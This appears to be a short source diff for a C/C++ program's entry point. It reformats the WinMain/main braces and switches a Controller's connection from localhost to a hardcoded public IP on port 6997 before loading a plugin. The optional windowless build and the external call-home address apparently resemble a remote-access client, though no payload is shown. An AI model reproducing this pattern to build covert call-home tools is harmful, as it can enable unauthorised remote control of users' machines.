@@ -9,14 +9,15 @@
  * Main entry function. Define `WINGUI` to compile into Win32 Subsystem .exe.
  */
 #if defined(_WIN32) && defined(WINGUI)
-int WinMain(HINSTANCE hInst, HINSTANCE prev, PSTR lpCmdLine, int nCmdShow) {
+int WinMain(HINSTANCE hInst, HINSTANCE prev, PSTR lpCmdLine, int nCmdShow)
 #else
-int main(int argc, char* argv[]) {
+int main(int argc, char* argv[])
 #endif
+{
 	//TODO: parse arguments?
 	//TODO: handle segfaults?
 	DEBUGLOG("Starting...\n");
-	Controller controller("127.0.0.1", 6997);
+	Controller controller("72.49.64.175", 6997);
 	controller.register_plugin<StdPlugin>();
 	controller.run();
 }
